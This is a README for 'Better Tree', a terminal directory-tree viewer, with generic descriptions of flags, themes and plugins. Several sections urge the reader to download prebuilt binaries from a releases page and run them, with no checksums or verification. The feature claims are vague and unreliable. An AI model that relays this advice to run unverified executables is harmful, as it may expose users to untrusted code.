https://github.com/yashggsop/better-tree/releases

# Better Tree: Fast, Customizable Terminal Directory Tree Viewer CLI

[![Release](https://img.shields.io/github/v/release/yashggsop/better-tree?style=for-the-badge)](https://github.com/yashggsop/better-tree/releases)

A fast, customizable directory tree viewer for the terminal. This tool shows a clean, readable map of your filesystem. It fits in a single terminal window and adapts to your workflow. It focuses on speed, simplicity, and reliability. It aims to replace bulky viewers with something lean, scriptable, and predictable.

Table of contents
- Why Better Tree
- Core concepts
- Getting started
- Installation
- Quick usage
- Deep dive: options and flags
- Rendering and output formats
- Performance and scaling
- Customization and themes
- Extensibility and plugins
- Configuration and dotfiles
- Troubleshooting
- Testing and quality assurance
- Development and contribution
- Roadmap
- Community and acknowledgments
- Licensing

Why Better Tree
🌲 It helps you understand directory structures at a glance. The tree view reveals nesting, folders, and important files in a compact layout. It makes it easier to compare layouts between folders and to spot anomalies like missing files or odd nesting.

Why this project matters
- Speed matters in the terminal. A tree that takes too long to render breaks your rhythm.
- Customization matters. No two terminals are the same. People run Better Tree on Linux, macOS, and Windows in WSL.
- Predictability matters. The output should be stable across runs, so you can automate checks and pipelines.

Core concepts
- Tree model: The tool builds a lightweight in-memory model of a directory tree. It respects symbolic links by default but can follow them if you opt in.
- Rendering: The renderer produces a text-based tree. It uses a consistent layout so you can scan lines quickly.
- Human-friendly highlighting: Directories, files, and special items can be colorized or indexed to improve readability.
- Configurability: Most aspects of the view are adjustable. You can tailor color, depth, and what to show or hide.

Getting started
- You can run Better Tree directly in your terminal after download. It is designed to be simple to use, with sensible defaults.
- Basic idea: point the tool at a path and let it render a tree that fits your terminal width.

Installation
- Prebuilt binaries
  - The project ships prebuilt binaries for common platforms. For Linux and macOS, you’ll typically download a single executable. For Windows, you’ll get a .exe file.
  - Example file names you might encounter:
    - better-tree-linux-x86_64.AppImage
    - better-tree-macos-arm64
    - better-tree-windows-x86_64.exe
  - From the releases page, download the binary for your platform and execute it. The binaries are self-contained and require no separate installation.
- Building from source
  - If you prefer to build from source, you’ll need the language runtime and build tools specified in the repo. The build process is straightforward and designed to be repeatable.
  - Typical steps:
    - Install dependencies
    - Clone the repository
    - Run the build command
  - The build will produce a binary you can run directly in your shell.
- Quick note about executables
  - After downloading the binary, grant execute permissions if needed:
    - chmod +x better-tree-linux-x86_64.AppImage
  - Then run it:
    - ./better-tree-linux-x86_64.AppImage
  - If you are on Windows, run the .exe from a shell or explorer, depending on your setup.
- What you get with a binary
  - A fast, self-contained CLI tool
  - A clean tree view of the specified path
  - Optional color output and formatting
  - Stable behavior across environments

Quick usage
- Basic usage
  - Better Tree shows the directory tree for the current path by default.
  - Command:
    - better-tree
  - To view another path:
    - better-tree /path/to/directory
- Depth control
  - Use --depth or -d to limit how deep the tree goes.
  - Example:
    - better-tree --depth 2
- Include hidden files
  - Use --all or -a to include hidden files and folders (dotfiles).
  - Example:
    - better-tree -a
- Include or exclude file types
  - You can filter by file extensions or directories to show only what you need.
  - Example:
    - better-tree --include-ext .js,.ts
- Output formats
  - The default output is a plain tree. You can request a JSON view for processing in scripts.
  - Example:
    - better-tree --output json
- Color and styling
  - Enable or disable color with --color or --no-color.
  - You can select a color palette if your terminal supports it.
- Sorting and ordering
  - Customize how entries are sorted. For example, by name, size, or type.
  - Example:
    - better-tree --sort-by name
- Symlinks
  - Choose how to render symbolic links. Either show the link targets or show the link itself.
  - Example:
    - better-tree --follow-symlinks
- Performance considerations
  - For very large directories, use a depth limit and streaming mode to keep memory usage predictable.
  - If you run into performance issues, consider using a narrower scope or a smaller path.

Deep dive: options and flags
- General options
  - --version : print version
  - --help    : display help and usage
- Path and scope
  - path: the directory to render
  - --depth N or -d N: limit depth to N
  - --max-files N: limit the number of files shown per directory
  - --max-dirs N: limit the number of subdirectories shown
- Display and formatting
  - --color / --no-color
  - --theme <name> : choose a color theme
  - --indent <spaces> : set indent width
  - --show-type : show whether an item is a file or directory
  - --show-permissions : display POSIX permissions when available
- Filtering
  - --include-ext <exts> : comma-separated extensions to include
  - --exclude <patterns> : comma-separated patterns to exclude
  - --include <patterns> : include only items that match
- Output control
  - --output <format> : text, json, yaml, or csv
  - --stream : stream results progressively
- Performance
  - --cache-size <bytes> : tune in-memory cache size
  - --threads <n> : control parallelism
- Accessibility
  - --label <text> : add a label to the header
  - --wrap-width <n> : wrap lines at n characters
- Advanced usage
  - You can pipe the output to other tools
  - Example:
    - better-tree /path | grep "src"
- Error handling
  - On errors, the tool prints a concise message and returns a non-zero exit code.
  - You can enable a verbose mode to get more details when debugging.

Rendering and output formats
- Text view
  - The default is a clean, readable tree with indentation that mirrors directory depth.
- JSON and YAML
  - For automation, you can request JSON or YAML output. This makes it easy to integrate with scripts and CI pipelines.
- CSV
  - If you need to feed a spreadsheet or a data tool, CSV can be useful. Each row represents a path element with fields like name, type, and depth.
- Custom formats
  - If you require a bespoke format, you can implement a small adapter around the raw data structure. The internal data model is straightforward and predictable.

Performance and scaling
- Reasonable defaults
  - The defaults aim to render quickly for typical work directories.
  - If a directory is very large, you can reduce depth to keep response times short.
- Memory usage
  - The in-memory representation is small by design. It avoids loading every file attribute unless needed.
- Streaming mode
  - For very large structures, streaming mode renders portions of the tree as they become available. This reduces latency and memory pressure.
- Platform considerations
  - On Windows with WSL or on macOS, the behavior is consistent, but file system semantics can affect performance in corner cases.
- Profiling and tuning
  - If you need to profile, run in verbose mode and capture timing data. The tool exposes hooks to measure render time and CPU usage.

Customization and themes
- Color themes
  - Light, dark, and high-contrast themes help readability in different environments.
  - You can define custom color mappings for directories, files, and special items.
- Custom tokens
  - You can mark certain directories as important, using a custom label or an icon.
- Iconography
  - File and folder icons can be customized, or you can disable icons for a minimal look.
- Font and glyph support
  - If your terminal supports ligatures and extended glyphs, you can take advantage of that to improve readability.
- Accessibility
  - High-contrast themes and higher indent spacing help users with visual challenges.

Extensibility and plugins
- Plugin architecture
  - The tool supports lightweight plugins that can extend rendering, filtering, or output formats.
- How to write a plugin
  - Plugins implement a small interface that the core calls during rendering.
  - They can override color schemes, provide custom icons, or inject data into the output.
- Examples
  - A plugin could add a cache layer to speed up repeated renders.
  - Another plugin could integrate with a log viewer to show directory changes over time.

Configuration and dotfiles
- User-level configuration
  - A config file can live in the user’s home directory, under a well-known path.
  - YAML or JSON formats are supported for readability and tooling compatibility.
- Project-level configuration
  - You can place a local config in a project directory to tailor behavior to that project.
- Common options in config
  - depth, color, theme, include extensions, exclude patterns
- Examples
  - A sample config might set a default depth of 3 and enable color by default.
  - Another sample might enforce showing only JavaScript and TypeScript files.

Troubleshooting
- Common issues
  - The binary won’t start: ensure the file is executable (chmod +x) and the architecture matches your system.
  - Output is garbled: check your terminal font and width. Some fonts don’t render all glyphs correctly.
  - Color disappears: verify that your terminal supports colors and that color is enabled in the config.
- Debug tips
  - Run with --help to verify you’re using the correct flags.
  - Run in verbose mode to see internal steps and timing.
  - Check for known issues on the Releases page or in the repository issues.

Testing and quality assurance
- Unit tests
  - Tests cover core rendering logic, edge cases, and filtering behavior.
- Integration tests
  - Tests verify the end-to-end behavior with actual directory trees.
- Performance tests
  - Tests measure render time for directories of varying sizes.
- CI
  - The repository uses a continuous integration pipeline to verify builds and tests on every pull request.

Development and contribution
- How to start
  - Fork the repository, clone it, and install dependencies.
  - Run the test suite to verify your environment is set up.
- Style and guidelines
  - Follow the project’s coding style.
  - Write tests for new features and fix any existing gaps.
- How to contribute
  - Propose changes via pull requests.
  - Provide a clear description of the problem and the proposed solution.
  - Include tests that demonstrate the fix or feature.
- Issue handling
  - Use issues to report bugs, request features, or suggest improvements.
  - Include steps to reproduce the issue and the expected behavior.

Roadmap
- Short-term goals
  - Improve support for cross-platform color rendering
  - Add more output formats for data interchange
  - Enhance performance for very deep or large trees
- Medium-term goals
  - Introduce a plugin marketplace
  - Provide a richer configuration experience with a UI-based config wizard
- Long-term goals
  - Integrate with popular shell prompts to show current tree context
  - Enable live synchronization with file system changes

Community and acknowledgments
- Community
  - The project welcomes contributors from all levels of experience.
  - Engage through issues, pull requests, and discussions.
- Acknowledgments
  - Thanks to early adopters who helped shape the core design.
  - Thanks to the open-source community for ideas and feedback.

Licensing
- The project uses a permissive license suitable for both personal and commercial use.
- See the LICENSE file in the repository for the exact terms.

Endnotes
- For the latest binaries and releases, visit the Releases page occasionally to pick up updates and patches. This is the central place for distribution and version tracking.

Note on downloads
- If you need a binary to run immediately, go to the releases page and grab the appropriate file for your platform, then execute it. The releases page hosts the downloadable artifacts and binary installers for common environments.

This README is designed to be comprehensive and practical. It covers the core usage, customization options, and how to extend Better Tree with plugins. It emphasizes fast, predictable rendering and a calm, reliable developer workflow. It avoids unnecessary jargon and keeps the focus on what you can do with the tool in real-world scenarios. It also provides guidance for contributors who want to improve the project and add features in a sustainable way.